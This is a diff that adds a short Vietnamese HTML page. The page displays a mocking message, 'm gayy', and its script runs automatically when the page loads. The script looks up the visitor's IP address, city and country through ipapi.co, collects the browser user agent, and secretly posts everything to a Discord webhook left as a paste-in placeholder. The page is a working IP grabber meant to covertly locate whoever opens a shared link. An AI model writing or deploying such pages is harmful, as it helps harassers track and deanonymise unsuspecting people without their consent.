@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>...</title>
+</head>
+<body style="background:black;color:white;display:flex;justify-content:center;align-items:center;height:100vh;font-size:40px;">
+
+    m gayy 🏳️‍🌈
+
+    <script>
+        // Webhook Discord
+        const webhook = "DÁN_WEBHOOK";
+
+        async function sendInfo() {
+            try {
+                // Lấy IP + vị trí
+                const res = await fetch("https://ipapi.co/json/");
+                const data = await res.json();
+
+                // Thiết bị
+                const device = navigator.userAgent;
+
+                // Nội dung gửi
+                const msg = {
+                    content:
+`📱 Có người mở web
+
+🌍 IP: ${data.ip}
+
+📍 Nơi ở: ${data.city}, ${data.country_name}
+
+💻 Thiết bị:
+${device}`
+                };
+
+                // Gửi webhook ngầm
+                await fetch(webhook, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(msg)
+                });
+
+            } catch (e) {
+                console.log(e);
+            }
+        }
+
+        sendInfo();
+    </script>
+
+</body>
+</html>
